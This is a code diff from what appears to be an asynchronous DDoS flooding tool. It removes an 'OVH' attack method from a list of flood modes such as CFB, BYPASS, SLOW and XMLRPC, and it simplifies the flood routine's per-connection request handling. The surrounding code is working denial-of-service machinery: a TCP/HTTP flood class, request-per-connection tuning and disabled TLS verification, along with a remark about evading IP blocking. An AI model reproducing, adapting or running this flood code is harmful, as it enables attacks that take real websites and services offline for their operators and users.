@@ -67,7 +67,7 @@ trex_ctx.set_verify(SSL.VERIFY_NONE, None)
 class Methods:
     HTTP_METHODS: Set[str] = {
         "CFB", "BYPASS", "GET", "RGET", "HEAD", "RHEAD", "POST", "STRESS", "DYN", "SLOW",
-        "NULL", "COOKIE", "PPS", "EVEN", "AVB", "OVH",
+        "NULL", "COOKIE", "PPS", "EVEN", "AVB",
         "APACHE", "XMLRPC", "DOWNLOADER", "RHEX", "STOMP",
         # this is not HTTP method (rather TCP) but this way it works with --http-methods
         # settings being applied to the entire set of targets
@@ -290,24 +290,20 @@ class AsyncTcpFlood:
             else:
                 raise exc
 
-    # XXX: get rid of RPC param when OVH is gone
     async def _generic_flood_proto(
         self,
         payload_type: FloodSpecType,
         payload,
         on_connect: Optional[asyncio.Future],
-        *,
-        rpc: Optional[int] = None
     ) -> bool:
         on_close = self._loop.create_future()
-        rpc = rpc or self._settings.requests_per_connection
         flood_proto = partial(
             FloodIO,
             self._loop,
             on_close,
             self._stats,
             self._settings,
-            FloodSpec.from_any(payload_type, payload, rpc),
+            FloodSpec.from_any(payload_type, payload, self._settings.requests_per_connection),
             on_connect=on_connect,
         )
         server_hostname = "" if self.is_tls else None
@@ -483,18 +479,6 @@ class AsyncTcpFlood:
                 yield FloodOp.READ, 1
 
         return await self._generic_flood_proto(FloodSpecType.GENERATOR, _gen(), on_connect)
-
-    async def OVH(self, on_connect=None) -> int:
-        payload: bytes = self.build_request()
-        # XXX: we might want to remove this attack as we don't really
-        #      track cases when high number of packets on the same connection
-        #      leads to IP being blocked
-        return await self._generic_flood_proto(
-            FloodSpecType.BYTES,
-            payload,
-            on_connect,
-            rpc=min(self._settings.requests_per_connection, 5),
-        )
 
     async def AVB(self, on_connect=None) -> bool:
         packet: bytes = self.build_request()
